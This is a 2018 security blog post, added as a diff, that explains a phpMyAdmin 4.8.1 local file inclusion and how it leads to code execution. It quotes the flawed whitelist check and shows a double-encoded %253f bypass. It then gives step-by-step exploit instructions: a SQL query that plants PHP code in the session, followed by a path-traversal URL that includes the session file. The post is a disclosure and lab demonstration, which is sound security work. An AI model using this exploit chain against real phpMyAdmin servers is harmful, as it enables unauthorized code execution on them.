@@ -1,0 +1,277 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>phpMyAdmin 4.8.x LFI to RCE (Authorization Required) | Vulnspy Blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="Author: @Ambulong Security Team ChaMd5 disclose a Local File Inclusion vulnerability in phpMyAdmin latest version 4.8.1. And the exploiting of this vulnerability may lead to Remote Code Execution. In">
+<meta name="keywords" content="Exploit">
+<meta property="og:type" content="article">
+<meta property="og:title" content="phpMyAdmin 4.8.x LFI to RCE (Authorization Required)">
+<meta property="og:url" content="http://blog.vulnspy.com/2018/06/21/phpMyAdmin-4-8-x-Authorited-CLI-to-RCE/index.html">
+<meta property="og:site_name" content="Vulnspy Blog">
+<meta property="og:description" content="Author: @Ambulong Security Team ChaMd5 disclose a Local File Inclusion vulnerability in phpMyAdmin latest version 4.8.1. And the exploiting of this vulnerability may lead to Remote Code Execution. In">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http://blog.vulnspy.com/2018/06/21/phpMyAdmin-4-8-x-Authorited-CLI-to-RCE/exp_1.png">
+<meta property="og:image" content="http://blog.vulnspy.com/2018/06/21/phpMyAdmin-4-8-x-Authorited-CLI-to-RCE/exp_2.png">
+<meta property="og:image" content="http://blog.vulnspy.com/2018/06/21/phpMyAdmin-4-8-x-Authorited-CLI-to-RCE/exp_3.png">
+<meta property="og:image" content="http://blog.vulnspy.com/2018/06/21/phpMyAdmin-4-8-x-Authorited-CLI-to-RCE/exp_4.png">
+<meta property="og:updated_time" content="2018-06-21T01:35:16.886Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="phpMyAdmin 4.8.x LFI to RCE (Authorization Required)">
+<meta name="twitter:description" content="Author: @Ambulong Security Team ChaMd5 disclose a Local File Inclusion vulnerability in phpMyAdmin latest version 4.8.1. And the exploiting of this vulnerability may lead to Remote Code Execution. In">
+<meta name="twitter:image" content="http://blog.vulnspy.com/2018/06/21/phpMyAdmin-4-8-x-Authorited-CLI-to-RCE/exp_1.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Vulnspy Blog" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+  
+
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-108901411-1"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+
+    gtag('config', 'UA-108901411-1');
+  </script>
+
+</head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Vulnspy Blog</a>
+      </h1>
+      
+        <h2 id="subtitle-wrap">
+          <a href="/" id="subtitle">Vulnspy Blog</a>
+        </h2>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Vulnspy Blog</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="搜索"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://blog.vulnspy.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-phpMyAdmin-4-8-x-Authorited-CLI-to-RCE" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2018/06/21/phpMyAdmin-4-8-x-Authorited-CLI-to-RCE/" class="article-date">
+  <time datetime="2018-06-21T00:16:03.000Z" itemprop="datePublished">2018-06-21</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      phpMyAdmin 4.8.x LFI to RCE (Authorization Required)
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>Author: <a href="https://twitter.com/ambulong" target="_blank" rel="external">@Ambulong</a></p>
+<p>Security Team <a href="http://chamd5.org" target="_blank" rel="external">ChaMd5</a> disclose a <a href="https://mp.weixin.qq.com/s/mukO4t_J_SSfGmyfzDo4Fg" target="_blank" rel="external">Local File Inclusion vulnerability in phpMyAdmin latest version 4.8.1</a>. And the exploiting of this vulnerability may lead to Remote Code Execution.</p>
+<p>In this article, we will use VulnSpy’s <a href="http://www.vulnspy.com/phpmyadmin-4.8.1/" target="_blank" rel="external">online phpMyAdmin environment</a> to demonstrate the exploit of this vulnerability.</p>
+<p><strong>VulnSpy’s online phpMyAdmin environment address: <a href="http://www.vulnspy.com/phpmyadmin-4.8.1/" target="_blank" rel="external">http://www.vulnspy.com/phpmyadmin-4.8.1/</a></strong></p>
+<h2 id="Vulnerability-Details"><a href="#Vulnerability-Details" class="headerlink" title="Vulnerability Details"></a>Vulnerability Details</h2><p>1.Line 54-63 in file <a href="https://github.com/phpmyadmin/phpmyadmin/blob/848fed8cbd6b30b4ee6394d5f694b8429119f51c/index.php#L61" target="_blank" rel="external">/index.php</a>:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// If we have a valid target, let's load that script instead</span></div><div class="line"><span class="keyword">if</span> (! <span class="keyword">empty</span>($_REQUEST[<span class="string">'target'</span>])</div><div class="line">    &amp;&amp; is_string($_REQUEST[<span class="string">'target'</span>])</div><div class="line">    &amp;&amp; ! preg_match(<span class="string">'/^index/'</span>, $_REQUEST[<span class="string">'target'</span>])</div><div class="line">    &amp;&amp; ! in_array($_REQUEST[<span class="string">'target'</span>], $target_blacklist)</div><div class="line">    &amp;&amp; Core::checkPageValidity($_REQUEST[<span class="string">'target'</span>])</div><div class="line">) &#123;</div><div class="line">    <span class="keyword">include</span> $_REQUEST[<span class="string">'target'</span>];</div><div class="line">    <span class="keyword">exit</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>2.Core::checkPageValidity in <a href="https://github.com/phpmyadmin/phpmyadmin/blob/848fed8cbd6b30b4ee6394d5f694b8429119f51c/libraries/classes/Core.php#L443" target="_blank" rel="external">/libraries/classes/Core.php</a></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/**</span></div><div class="line"><span class="comment"> * boolean phpMyAdmin.Core::checkPageValidity(string &amp;$page, array $whitelist)</span></div><div class="line"><span class="comment"> *</span></div><div class="line"><span class="comment"> * checks given $page against given $whitelist and returns true if valid</span></div><div class="line"><span class="comment"> * it optionally ignores query parameters in $page (script.php?ignored)</span></div><div class="line"><span class="comment"> *</span></div><div class="line"><span class="comment"> * <span class="doctag">@param</span> string &amp;$page     page to check</span></div><div class="line"><span class="comment"> * <span class="doctag">@param</span> array  $whitelist whitelist to check page against</span></div><div class="line"><span class="comment"> *</span></div><div class="line"><span class="comment"> * <span class="doctag">@return</span> boolean whether $page is valid or not (in $whitelist or not)</span></div><div class="line"><span class="comment"> */</span></div><div class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkPageValidity</span><span class="params">(&amp;$page, array $whitelist = [])</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>($whitelist)) &#123;</div><div class="line">        $whitelist = <span class="keyword">self</span>::$goto_whitelist;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span> (! <span class="keyword">isset</span>($page) || !is_string($page)) &#123;</div><div class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span> (in_array($page, $whitelist)) &#123;</div><div class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</div><div class="line">    &#125;</div><div class="line">    $_page = mb_substr(</div><div class="line">        $page,</div><div class="line">        <span class="number">0</span>,</div><div class="line">        mb_strpos($page . <span class="string">'?'</span>, <span class="string">'?'</span>)</div><div class="line">    );</div><div class="line">    <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</div><div class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</div><div class="line">    &#125;</div><div class="line">    $_page = urldecode($page);</div><div class="line">    $_page = mb_substr(</div><div class="line">        $_page,</div><div class="line">        <span class="number">0</span>,</div><div class="line">        mb_strpos($_page . <span class="string">'?'</span>, <span class="string">'?'</span>)</div><div class="line">    );</div><div class="line">    <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</div><div class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>Core::checkPageValidity can be bypassed by using by double encoding like <code>%253f</code>.</p>
+<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>An attacker can use this vulnerability to include session file to lauching a Remote Code Execution vulnerability.</p>
+<p><strong>1.Use username root, password toor log into phpmyadmin.</strong></p>
+<img src="/2018/06/21/phpMyAdmin-4-8-x-Authorited-CLI-to-RCE/exp_1.png" alt="Login PMA" title="Login PMA">
+<p><strong>2.Run SQL query</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> <span class="string">'&lt;?php phpinfo();exit;?&gt;'</span></div></pre></td></tr></table></figure>
+<img src="/2018/06/21/phpMyAdmin-4-8-x-Authorited-CLI-to-RCE/exp_2.png" alt="Login PMA" title="Login PMA">
+<p><strong>3.Get your Session ID</strong></p>
+<p>Session ID is the item <code>phpMyAdmin</code> in your cookie.</p>
+<img src="/2018/06/21/phpMyAdmin-4-8-x-Authorited-CLI-to-RCE/exp_3.png" alt="Login PMA" title="Login PMA">
+<p><strong>4.Include the session file</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://1a23009a9c9e959d9c70932bb9f634eb.vsplate.me/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/sessions/sess_11njnj4253qq93vjm9q93nvc7p2lq82k</div></pre></td></tr></table></figure>
+<img src="/2018/06/21/phpMyAdmin-4-8-x-Authorited-CLI-to-RCE/exp_4.png" alt="Login PMA" title="Login PMA">
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://blog.vulnspy.com/2018/06/21/phpMyAdmin-4-8-x-Authorited-CLI-to-RCE/" data-id="cjintzy6b000inzpvb2tnhgdh" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Exploit/">Exploit</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2018/06/12/phpMyAdmin-4-7-x-XSRF-CSRF-vulnerability-PMASA-2017-9-exploit/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">phpMyAdmin 4.7.x XSRF/CSRF Vulnerability (PMASA-2017-9) Exploit</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  <div class="widget-wrap">
+    <h3 class="widget-title">Donate</h3>
+    <div class="widget" style="background: #FFF;">
+       <p style="text-align:center;">If you find our work, our reports useful to you, we invite you to donate to us.</p>
+<form action="https://www.paypal.com/cgi-bin/webscr" method="post" style="text-align:center;" target="_blank">
+
+    <!-- Identify your business so that you can collect the payments. -->
+    <input type="hidden" name="business"
+        value="zeng.ambulong@gmail.com">
+
+    <!-- Specify a Donate button. -->
+    <input type="hidden" name="cmd" value="_donations">
+
+    <!-- Specify details about the contribution -->
+    <input type="hidden" name="item_name" value="Friends of vulnspy.com">
+    <input type="hidden" name="item_number" value="vulnspy">
+    <input type="hidden" name="currency_code" value="USD">
+
+    <!-- Display the payment button. -->
+    <input style="margin-top: 1em;" type="image" name="submit"
+    src="https://www.paypalobjects.com/en_US/i/btn/btn_donate_LG.gif"
+    alt="Donate">
+    <img alt="" width="1" height="1"
+    src="https://www.paypalobjects.com/en_US/i/scr/pixel.gif" >
+
+</form>
+    </div>
+  </div>
+  
+    
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">标签</h3>
+    <div class="widget">
+      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Exploit/">Exploit</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/渗透测试/">渗透测试</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/漏洞分析/">漏洞分析</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/漏洞利用/">漏洞利用</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">归档</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/06/">六月 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/11/">十一月 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/09/">九月 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/08/">八月 2017</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">最新文章</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2018/06/21/phpMyAdmin-4-8-x-Authorited-CLI-to-RCE/">phpMyAdmin 4.8.x LFI to RCE (Authorization Required)</a>
+          </li>
+        
+          <li>
+            <a href="/2018/06/12/phpMyAdmin-4-7-x-XSRF-CSRF-vulnerability-PMASA-2017-9-exploit/">phpMyAdmin 4.7.x XSRF/CSRF Vulnerability (PMASA-2017-9) Exploit</a>
+          </li>
+        
+          <li>
+            <a href="/2018/06/10/phpMyAdmin-4-7-x-XSRF-CSRF-vulnerability-exploit/">phpMyAdmin 4.7.x CSRF 漏洞利用</a>
+          </li>
+        
+          <li>
+            <a href="/2017/11/09/Wordpress-4-8-2-SQL-Injection-POC/">Wordpress &lt;= 4.8.2 SQL Injection POC</a>
+          </li>
+        
+          <li>
+            <a href="/2017/09/05/Wordpress-POST-META-Check-Bypass/">Wordpress POST META_NAME校验绕过</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2018 <a href="mailto:zeng.ambulong@gmail.com">Ambulong</a><br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Vulnspy Blog</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+
+  </div>
+</body>
+</html>
